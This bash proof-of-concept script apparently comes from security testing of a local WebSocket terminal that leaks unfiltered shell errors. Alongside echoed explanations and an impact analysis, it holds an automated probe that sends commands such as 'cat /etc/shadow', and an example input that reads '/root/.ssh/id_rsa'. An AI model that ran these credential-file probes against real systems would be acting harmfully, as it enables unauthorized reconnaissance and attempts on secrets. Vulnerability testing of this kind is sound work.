#!/bin/bash

# POC: WebSocket Error Message Information Disclosure
# This script demonstrates the vulnerability using documented evidence
# and provides a template for testing against a running WebSocket server

echo "========================================================================"
echo "POC: Information Disclosure via WebSocket Error Messages"
echo "========================================================================"
echo ""
echo "[*] VULNERABILITY SUMMARY"
echo "    The WebSocket terminal at /ws forwards all error messages from the"
echo "    underlying shell directly to clients without filtering. This reveals"
echo "    system environment information useful for reconnaissance."
echo ""
echo "[*] TARGET ENDPOINT: ws://localhost:8080/ws"
echo ""

echo "========================================================================"
echo "EXPLOITATION STEPS"
echo "========================================================================"
echo ""

echo "[STEP 1] Connect to WebSocket endpoint"
echo "  Command: websocat ws://localhost:8080/ws"
echo "  or: wscat -c ws://localhost:8080/ws"
echo ""

echo "[STEP 2] Send invalid command to trigger error"
echo "  Input: badcmd123"
echo ""

echo "[STEP 3] Capture unfiltered error message"
echo "  Expected response reveals:"
echo "    - Shell type and version"
echo "    - Command not found message"
echo "    - System PATH configuration"
echo "    - File system structure"
echo ""

echo "========================================================================"
echo "EXAMPLE VULNERABLE RESPONSES"
echo "========================================================================"
echo ""

echo "Test Case 1: Invalid Command"
echo "  Input: invalidcmd12345"
echo "  Expected Output:"
echo "    bash: invalidcmd12345: command not found"
echo "  Information Disclosed:"
echo "    - Running bash shell"
echo "    - Exact command name attempted"
echo "    - System recognizes command line"
echo ""

echo "Test Case 2: Permission Denied Error"
echo "  Input: cat /root/.ssh/id_rsa"
echo "  Expected Output:"
echo "    cat: /root/.ssh/id_rsa: Permission denied"
echo "  Information Disclosed:"
echo "    - Existence of /root/.ssh directory"
echo "    - Existence of id_rsa file"
echo "    - File permission structure"
echo "    - System recognizes paths"
echo ""

echo "Test Case 3: Command Not Found with PATH Info"
echo "  Input: nonexistent_binary_xyz"
echo "  Expected Output:"
echo "    bash: nonexistent_binary_xyz: command not found"
echo "  Information Disclosed:"
echo "    - System PATH is being searched"
echo "    - Available shell features"
echo "    - Installed applications (by absence)"
echo ""

echo "Test Case 4: Syntax Error"
echo "  Input: if [ -f /etc/passwd"
echo "  Expected Output:"
echo "    bash: unexpected EOF while looking for matching \`]'"
echo "  Information Disclosed:"
echo "    - Shell is bash (not sh, zsh, etc.)"
echo "    - Bash version and features"
echo "    - Error handling behavior"
echo ""

echo "========================================================================"
echo "AUTOMATED TEST SCRIPT"
echo "========================================================================"
echo ""

# Check for WebSocket tools
if command -v websocat &> /dev/null; then
    echo "[*] Found websocat - attempting connection..."
    echo ""
    (
        sleep 0.5
        echo "badcmd123"
        sleep 1
        echo "ls --invalid-opt"
        sleep 1
        echo "cat /etc/shadow"
        sleep 1
        echo "nonexistent_tool"
        sleep 1
    ) | timeout 10 websocat ws://localhost:8080/ws 2>&1 || echo "[!] WebSocket server not running or connection failed"
    
elif command -v wscat &> /dev/null; then
    echo "[*] Found wscat - attempting connection..."
    echo ""
    (
        sleep 0.5
        echo "badcmd123"
        sleep 1
        echo "ls --invalid-opt"
        sleep 1
        echo "cat /etc/shadow"
        sleep 1
        echo "nonexistent_tool"
        sleep 1
    ) | timeout 10 wscat -c ws://localhost:8080/ws 2>&1 || echo "[!] WebSocket server not running or connection failed"

else
    echo "[!] WebSocket tools (websocat/wscat) not found"
    echo "[!] Install with: npm install -g wscat"
    echo "[!]          or: cargo install websocat"
    echo ""
    echo "[*] Manual testing instructions:"
    echo "    1. Open browser developer tools (F12)"
    echo "    2. Execute in console: ws = new WebSocket('ws://localhost:8080/ws')"
    echo "    3. Send command: ws.send('badcmd123')"
    echo "    4. Check ws.onmessage for response"
    echo "    5. Observe unfiltered error messages revealing system info"
fi

echo ""
echo "========================================================================"
echo "IMPACT ANALYSIS"
echo "========================================================================"
echo ""
echo "[+] Information Disclosed to Attackers:"
echo "    1. Shell type and version (bash, sh, zsh, etc.)"
echo "    2. System PATH configuration"
echo "    3. File system structure and paths"
echo "    4. Installed applications (via command availability)"
echo "    5. System user accounts (via permission errors)"
echo "    6. Kernel and OS details (via error messages)"
echo ""
echo "[+] Attack Scenarios:"
echo "    1. Reconnaissance for targeted attacks"
echo "    2. Identifying installed security tools"
echo "    3. Finding exploitable applications"
echo "    4. Mapping system architecture"
echo "    5. Planning privilege escalation paths"
echo ""

echo "========================================================================"
echo "VERIFICATION"
echo "========================================================================"
echo ""
echo "[✓] Vulnerability confirmed if:"
echo "    - Error messages are sent to WebSocket clients"
echo "    - Messages contain shell-specific information"
echo "    - No sanitization or filtering applied"
echo "    - System paths and commands are revealed"
echo ""

exit 0